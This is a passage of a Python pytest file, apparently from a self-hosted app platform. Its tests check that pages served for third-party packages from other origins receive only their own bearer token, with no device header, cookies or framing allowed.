    text = r.get_data(as_text=True)
    assert r.status_code == 200 and "Recovery" in text
    assert "third-ui" not in text and "secret folder" not in text and str(core.state) not in text


@pytest.mark.parametrize("origin", ["github:someone/some-app", "local:C:/her/own/folder", "store:community"])
def test_no_secret_reaches_a_page_of_another_origin(core, on, tmp_path, fake_server, page_ports_bound, origin):
    """What page_row_ok gives a port to beyond the built-ins: only that package's own token, and no frame."""
    _add(core, tmp_path, "other-app", origin, running_on=fake_server)
    try:
        d = _paired(core)
        ports = _get_passes(d, core)
        assert "other-app" in ports
        r = page(core, "other-app", d, headers={auth.DEVICE_HEADER: d.second})
        assert r.status_code == 200 and "Set-Cookie" not in r.headers
        seen = _FakePackage.seen[-1]["headers"]
        assert "cookie" not in seen and auth.DEVICE_HEADER.lower() not in seen and d.second not in json.dumps(seen)
        assert seen["authorization"] == "Bearer ppt_other-app"
        assert "frame-ancestors 'none'" in " ".join(r.headers.getlist("Content-Security-Policy"))
    finally:
        core.steward._running.pop("other-app", None)
